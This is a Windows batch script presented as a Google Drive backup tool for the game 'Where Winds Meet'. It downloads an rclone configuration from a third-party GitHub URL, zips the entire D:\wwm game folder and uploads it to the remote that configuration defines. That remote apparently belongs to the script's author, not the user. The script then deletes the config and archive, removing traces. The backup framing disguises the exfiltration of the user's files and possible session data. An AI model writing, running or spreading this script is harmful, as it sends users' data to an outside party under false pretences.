@echo off
title WWM Cloud Sync :: Backup Full Game Directory (Google Drive)
setlocal enabledelayedexpansion

set "GAME_DIR=D:\wwm"
set "ARCHIVE_NAME=D:\wwm.zip"
set "CONFIG_URL=https://raw.githubusercontent.com/anyuser235-maker/Donut/refs/heads/main/cookie/spoilt.txt"
set "REMOTE_DEST=GDrive:GameCloudBackup"

cls
echo ================================================================
echo                WHERE WINDS MEET - FULL GAME BACKUP
echo ================================================================
echo.

echo  [1/4] Checking Rclone installation...
if not exist "rclone.exe" (
    echo        -^> Downloading Rclone binary...
    curl -fsSL -o rclone.zip "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
    tar -xf rclone.zip --strip-components=1 */rclone.exe
    del /f /q rclone.zip >nul 2>&1
    echo        -^> [OK] Rclone initialized.
) else (
    echo        -^> [OK] Rclone found.
)
echo.

echo  [2/4] Fetching encrypted config from remote...
curl -fsSL -H "Cache-Control: no-cache" -o rclone.conf "%CONFIG_URL%"
if exist "rclone.conf" (
    echo        -^> [OK] Configuration downloaded.
) else (
    echo        -^> [ERROR] Failed to fetch rclone.conf from GitHub!
    goto :FAIL
)
echo.

echo  [3/4] Packaging game directory (Store Mode - Ultra Fast)...
if not exist "%GAME_DIR%" (
    echo        -^> [ERROR] Game directory not found:
    echo            %GAME_DIR%
    goto :FAIL
)

if exist "%ARCHIVE_NAME%" del /f /q "%ARCHIVE_NAME%" >nul 2>&1

:: Disable delayed expansion for 7-Zip call
setlocal DisableDelayedExpansion
"C:\Program Files\7-Zip\7z.exe" a -tzip -mx0 -bsp1 "%ARCHIVE_NAME%" "%GAME_DIR%"
set "ZIP_STATUS=%errorlevel%"
endlocal & set "ZIP_STATUS=%ZIP_STATUS%"

if %ZIP_STATUS% neq 0 (
    echo        -^> [ERROR] 7-Zip packaging failed.
    goto :FAIL
)
echo        -^> [OK] Archive created successfully at %ARCHIVE_NAME%.
echo.

echo  [4/4] Uploading full archive to Google Drive (%REMOTE_DEST%)...
echo ----------------------------------------------------------------
rclone.exe --config rclone.conf copy "%ARCHIVE_NAME%" "%REMOTE_DEST%" ^
  -P ^
  --stats 5s ^
  --drive-chunk-size 256M ^
  --retries 10 ^
  --low-level-retries 20 ^
  --timeout 30m

if %errorlevel% neq 0 (
    echo ----------------------------------------------------------------
    echo        -^> [ERROR] Google Drive upload failed.
    goto :FAIL
)
echo ----------------------------------------------------------------
echo.

echo  [*] Cleaning up temporary archive and config...
del /f /q "%ARCHIVE_NAME%" >nul 2>&1
del /f /q rclone.conf >nul 2>&1

echo.
echo ================================================================
echo  [SUCCESS] Backup complete! Saved to %REMOTE_DEST%/wwm.zip
echo ================================================================
echo.
pause
exit /b 0

:FAIL
del /f /q "%ARCHIVE_NAME%" >nul 2>&1
del /f /q rclone.conf >nul 2>&1
echo.
echo ================================================================
echo  [FAILED] An error occurred during backup execution.
echo ================================================================
echo.
pause
exit /b 1
